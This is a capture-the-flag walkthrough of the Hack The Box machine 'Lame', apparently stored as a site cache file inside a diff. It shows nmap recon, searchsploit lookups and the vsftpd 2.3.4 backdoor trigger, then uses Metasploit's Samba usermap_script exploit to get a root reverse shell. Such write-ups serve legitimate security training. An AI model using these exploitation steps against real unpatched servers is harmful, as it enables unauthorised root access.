@@ -1,0 +1,283 @@
+I"�3<p>Walkthrough for LAME - 10.10.10.3</p>
+
+<h2 id="overview">Overview</h2>
+
+<p>This is the first box on the HTB platform, this walkthrough has a straight to root exploit from metasploit.</p>
+
+<h3 id="tools-used">Tools Used</h3>
+
+<p>No special requirments, I used the following stock tools from Kali:</p>
+
+<ol>
+  <li>nmap</li>
+  <li>searchsploit</li>
+  <li>metasploit</li>
+</ol>
+
+<h2 id="recon">Recon</h2>
+
+<p>First I assign the ip address to a local variable:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TARGET</span><span class="o">=</span>10.10.10.3
+</code></pre></div></div>
+
+<p>We run the nmap scan to identify the running services:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nv">$TARGET</span>
+</code></pre></div></div>
+<p>this returns an error:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+</code></pre></div></div>
+
+<p>I know the service is up, let’s avoid using the ping</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nv">$TARGET</span> <span class="nt">-Pn</span>
+</code></pre></div></div>
+
+<p>That’s better now we get an output:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.3
+Host is up (0.040s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+</code></pre></div></div>
+
+<p>I kick it up a notch and go into an aggressive mode:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nv">$TARGET</span> <span class="nt">-Pn</span> <span class="nt">-p</span> 21,22,139,445 <span class="nt">-A</span>
+</code></pre></div></div>
+
+<p>gives us more verbose reading</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.3
+Host is up (0.039s latency).
+ 
+PORT    STATE    SERVICE     VERSION
+21/tcp  open     ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.10.14.23
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open     ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey:
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open     netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+Host script results:
+|_clock-skew: mean: -2d22h58m12s, deviation: 0s, median: -2d22h58m12s
+| smb-os-discovery:
+|   OS: Unix (Samba 3.0.20-Debian)
+|   NetBIOS computer name:
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2017-09-13T12:14:55-04:00
+|_smb2-time: Protocol negotiation failed (SMB2)
+ 
+</code></pre></div></div>
+
+<p>Time for some triage.</p>
+
+<h2 id="weaponisation">Weaponisation</h2>
+
+<p>Immediately the service versions look dated which bodes well for RCE.
+A quick look into the services with searchsploit we’ve potentially identified 2 that are vulnerable to remote code execution.</p>
+
+<p>Checking samba:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit samba 3.0
+</code></pre></div></div>
+<p>gives</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>----------------------------------------------------------------------------------- ----------------------------------------
+Exploit Title                                                                     |  Path
+                                                                                  | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------------- ----------------------------------------
+Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)               | exploits/osx/remote/16875.rb
+Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                             | exploits/multiple/remote/10095.txt
+Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)   | exploits/unix/remote/16320.rb
+Samba 3.0.21 &lt; 3.0.24 - LSA trans names Heap Overflow (Metasploit)                 | exploits/linux/remote/9950.rb
+Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)             | exploits/linux/remote/16859.rb
+Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)           | exploits/solaris/remote/16329.rb
+Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                           | exploits/linux/dos/4732.c
+Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                  | exploits/multiple/dos/5712.pl
+Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                   | exploits/linux/remote/364.pl
+Samba &lt; 3.0.20 - Remote Heap Overflow                                              | exploits/linux/remote/7701.txt
+----------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+</code></pre></div></div>
+
+<p><strong>Samba 3.0.20 &lt; 3.0.25rc3 - ‘Username’ map script’ Command Execution (Metasploit)</strong> looks promising:</p>
+
+<blockquote>
+  <p><em>This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default “username map script” configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands.</em></p>
+</blockquote>
+
+<blockquote>
+  <p><em>No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!</em></p>
+</blockquote>
+
+<p>This looks like a point and shoot, we’ll put a pin in that as a strong possibility to revisit.</p>
+
+<p>Also interesting is the vsftpd service:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit vsftpd 2.
+</code></pre></div></div>
+
+<p>gives us:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>----------------------------------------------------------------------------------- ----------------------------------------
+Exploit Title                                                                     |  Path
+                                                                                  | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------------- ----------------------------------------
+vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                     | exploits/linux/dos/5814.pl
+vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                     | exploits/windows/dos/31818.sh
+vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                     | exploits/windows/dos/31819.pl
+vsftpd 2.3.2 - Denial of Service                                                   | exploits/linux/dos/16270.c
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                             | exploits/unix/remote/17491.rb
+----------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+</code></pre></div></div>
+
+<p>We appear to have remote code execution via a deliberate backdoor via <strong>vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)</strong></p>
+
+<p>After reading the exploit code I was able to pull out this <a href="http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html">article</a> which explains that if we send a connection to ftp with a :) in the username it should spawn a backdoor shell on port 6200.</p>
+
+<p>Let’s check the port first</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nv">$TARGET</span> <span class="nt">-p</span> 6200 <span class="nt">-Pn</span>
+</code></pre></div></div>
+
+<p>looks like the port is filtered:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.3
+Host is up.
+ 
+PORT     STATE    SERVICE
+6200/tcp filtered lm-x
+</code></pre></div></div>
+
+<p>Interesting, I’d expect this port to be <strong>closed</strong> not filtered.</p>
+
+<p>By virtue of the port is filtered I’d expect potential issues connecting to a backdoor, this exploit is perhaps not the best way.</p>
+
+<p>Looks like the samba exploit will have a better chance of working.</p>
+
+<h2 id="delivery--exploit">Delivery &amp; Exploit</h2>
+
+<p>I load up metasploit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+</code></pre></div></div>
+<p>paying heed to the comment in the exploit: /usr/share/exploitdb/exploits/unix/remote/16320.rb</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $
+</code></pre></div></div>
+
+<p>I look for the exploit:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">search</span> <span class="n">usermap_script</span>
+</code></pre></div></div>
+
+<p>gives us the exploit:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Modules
+================
+ 
+  #  Name                                Disclosure Date  Rank       Check  Description
+  -  ----                                ---------------  ----       -----  -----------
+  0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+</code></pre></div></div>
+
+<p>lets configure it, and double check the options:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">samba</span><span class="o">/</span><span class="n">usermap_script</span>
+<span class="n">set</span> <span class="no">RHOSTS</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.3</span>
+<span class="n">set</span> <span class="no">VERBOSE</span> <span class="no">TRUE</span>
+<span class="n">show</span> <span class="n">options</span>
+</code></pre></div></div>
+
+<p>looks good:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Module options (exploit/multi/samba/usermap_script):
+ 
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS  10.10.10.3       yes       The target address range or CIDR identifier
+  RPORT   139              yes       The target port (TCP)
+ 
+ 
+Exploit target:
+ 
+  Id  Name
+  --  ----
+  0   Automatic
+</code></pre></div></div>
+
+<p>lets run the exploit:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">run</span>
+</code></pre></div></div>
+
+<p>pops a shell:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Started reverse TCP double handler on 10.10.14.23:4444
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo LQByr8MPJ3zhSZdr;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "LQByr8MPJ3zhSZdr\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.14.23:4444 -&gt; 10.10.10.3:54077) at 2017-09-16 21:16:51 +0100
+ 
+</code></pre></div></div>
+
+<p>let’s check our privs:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id</span>
+</code></pre></div></div>
+
+<p>and we’re root, W00tW00t!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=0(root) gid=0(root)
+</code></pre></div></div>
+
+<h2 id="value-extraction">Value Extraction</h2>
+
+<p>Time to get the trophies</p>
+
+<h3 id="getting-user">Getting User</h3>
+
+<p>xxxxxxxxxxxxxxxxxxxxa00acd2e84c5</p>
+
+<h3 id="getting-root">Getting Root</h3>
+
+<p>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
+
+<p>At this point I can grab the flags:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/makis/user.txt
+
+</code></pre></div></div>
+:ET
